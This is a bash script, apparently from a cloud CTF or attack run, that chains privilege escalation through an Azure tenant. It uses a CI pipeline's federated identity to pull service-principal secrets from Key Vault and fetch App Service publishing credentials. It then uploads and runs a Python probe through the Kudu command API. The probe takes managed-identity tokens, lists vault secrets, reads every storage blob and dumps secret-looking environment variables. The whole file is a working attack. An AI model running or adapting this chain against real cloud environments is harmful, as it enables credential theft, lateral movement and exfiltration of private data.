#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
UAMI_OID="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
UAMI_CID="7a85156a-01c4-4e61-8472-40a92107159b"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# cicd-deployer ARM token (Reader on platform RG - CAN read roleAssignments there)
ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

echo "=== UAMI ROLE ASSIGNMENTS VIA CICD-DEPLOYER (reliable) ==="
# Use cicd-deployer which has Reader on platform RG
curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$UAMI_OID'" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
err=d.get("error",{})
vals=d.get("value",[])
if err:
    print("ERROR:", err.get("code",""), err.get("message","")[:200])
else:
    print("Total UAMI role assignments:", len(vals))
    for r in vals:
        pid=r["properties"]["principalId"]
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        scope=r["properties"]["scope"]
        print(f"  role={role} scope={scope}")
' 2>/dev/null

echo ""
echo "=== ALL ROLE ASSIGNMENTS AT PLATFORM RG (using cicd-deployer) ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
print("Total:", len(vals))
for r in vals:
    pid=r["properties"]["principalId"]
    role=r["properties"]["roleDefinitionId"].split("/")[-1]
    scope=r["properties"]["scope"].replace("/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6","")
    print(f"  pid={pid[:8]} role={role[:8]} scope={scope[:80]}")
' 2>/dev/null

echo ""
echo "=== ALL ROLE ASSIGNMENTS AT STORAGE ACCOUNTS (cicd-deployer) ==="
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "--- $sa ---"
  curl -sS "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
    -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err:
    print("  ERROR:", err.get("code",""))
else:
    print("  Count:", len(vals))
    for r in vals:
        pid=r["properties"]["principalId"]
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        print(f"  pid={pid[:8]} role={role[:8]}")
' 2>/dev/null
done

echo ""
echo "=== GET REPORTING-SERVICE PUBLISHINGCREDENTIALS ==="
# Get reporting-service creds (Contributor on reporting RG)
RS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
RS_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "reporting-service ARM len=${#RS_AT}"

# Get publishing credentials using POST + ARM
PC_RESULT=$(curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0")
echo "Publishing creds result:"
echo "$PC_RESULT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
if "error" in d:
    print("ERROR:", d["error"].get("code",""), d["error"].get("message","")[:200])
else:
    props=d.get("properties",{})
    print("user:", props.get("publishingUserName",""))
    print("pass:", props.get("publishingPassword","")[:30]+"...")
' 2>/dev/null

echo ""
echo "=== DEPLOY PROBE SCRIPT TO REPORTING APP ==="
PU=$(echo "$PC_RESULT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC_RESULT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
echo "Kudu user: $PU"

if [ -n "$PU" ] && [ -n "$PP" ]; then
  SHOST="app-tbl-reporting-prod.scm.azurewebsites.net"

  # Write a Python script that tests ALL storage accounts with UAMI token
  cat > /tmp/probe_storage.py <<'PYEOF'
import os,json,urllib.request,urllib.parse,re

MIC="7a85156a-01c4-4e61-8472-40a92107159b"
ie=os.environ.get("IDENTITY_ENDPOINT","http://169.254.131.5:8081/msi/token")
ih=os.environ.get("IDENTITY_HEADER","")
o=["IE=%s"%(ie,)]

def tok(res):
    url=ie+"?resource="+urllib.parse.quote(res,safe="")+"&api-version=2019-08-01&client_id="+MIC
    req=urllib.request.Request(url,headers={"X-IDENTITY-HEADER":ih})
    return json.load(urllib.request.urlopen(req,timeout=30)).get("access_token","")

def rg(u,t,extra=None):
    h={"Authorization":"Bearer "+t,"x-ms-version":"2021-08-06"}
    if extra:h.update(extra)
    try:
        return urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=30).read().decode()
    except Exception as e:
        b=""
        try:b=e.read().decode("utf8","replace")[:500]
        except:pass
        return "ERR:"+str(e)[:200]+" "+b

# Try vault token first
try:
    VT=tok("https://vault.azure.net")
    o.append("VT_LEN=%d"%len(VT))
    for kv in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
        r=rg("https://"+kv+".vault.azure.net/secrets?api-version=7.4",VT)
        o.append(kv+"_LIST="+r[:2000])
except Exception as e:
    o.append("VT_ERR:"+str(e)[:200])

# Try storage token
try:
    ST=tok("https://storage.azure.com")
    o.append("ST_LEN=%d"%len(ST))
    for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"]:
        # List containers
        cl=rg("https://"+sa+".blob.core.windows.net/?comp=list",ST)
        o.append(sa+"_CONTAINERS="+cl[:1000])
        # Extract container names and list blobs
        for cn in re.findall(r"<Name>(.*?)</Name>",cl):
            bl=rg("https://"+sa+".blob.core.windows.net/"+cn+"?restype=container&comp=list",ST)
            o.append(sa+"/"+cn+"="+bl[:1000])
            # For each blob, try to read it
            for bn in re.findall(r"<Name>(.*?)</Name>",bl):
                bc=rg("https://"+sa+".blob.core.windows.net/"+cn+"/"+bn,ST)
                o.append("BLOB "+sa+"/"+cn+"/"+bn+"="+bc[:3000])
except Exception as e:
    o.append("ST_ERR:"+str(e)[:200])

# Also try ARM token
try:
    AT=tok("https://management.azure.com")
    o.append("AT_LEN=%d"%len(AT))
    # Try to list role assignments on KV sec
    import urllib.request
    r=rg("https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'f64d08c7-fde6-4553-99c8-5bf73666ee8c'",AT,{})
    o.append("UAMI_KV_SEC_RA="+r[:500])
except Exception as e:
    o.append("AT_ERR:"+str(e)[:200])

# Print env vars for debugging
import os
for k,v in os.environ.items():
    if any(x in k.upper() for x in ["IDENTITY","VAULT","SECRET","FLAG","KEY","CONN","STORAGE"]):
        o.append("ENV %s=%s"%(k,v[:200]))

print("\n".join(o))
PYEOF

  # Upload probe script
  VFS_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' -u "$PU:$PP" -X PUT \
    -H 'Content-Type: text/plain' --data-binary @/tmp/probe_storage.py \
    "https://${SHOST}/api/vfs/home/probe_storage.py")
  echo "VFS upload status: $VFS_STATUS"

  # Run it
  echo "Running probe..."
  OUT=$(curl -sS -m 120 -u "$PU:$PP" -H 'Content-Type: application/json' \
    -X POST "https://${SHOST}/api/command" \
    -d '{"command":"python3 /home/probe_storage.py","dir":"/home"}')
  echo "$OUT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
output=d.get("Output","")
error=d.get("Error","")
print("OUTPUT:")
print(output[:5000])
if error:
    print("ERROR:", error[:500])
' 2>/dev/null
fi

echo ""
echo "=== CHECK APPCFG STORAGE WITH SECRETS-SYNC ==="
SS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
SS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)

echo "secrets-sync appId: $SS_CID"
# Try storage data plane token
SS_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://storage.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "secrets-sync storage token len=${#SS_ST}"

if [ "${#SS_ST}" -gt 100 ]; then
  for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
    echo "--- $sa ---"
    CLIST=$(curl -sS "https://$sa.blob.core.windows.net/?comp=list" \
      -H "Authorization: Bearer $SS_ST" -H "x-ms-version: 2021-08-06")
    echo "$CLIST" | head -c 500
  done
fi

echo "DONE"
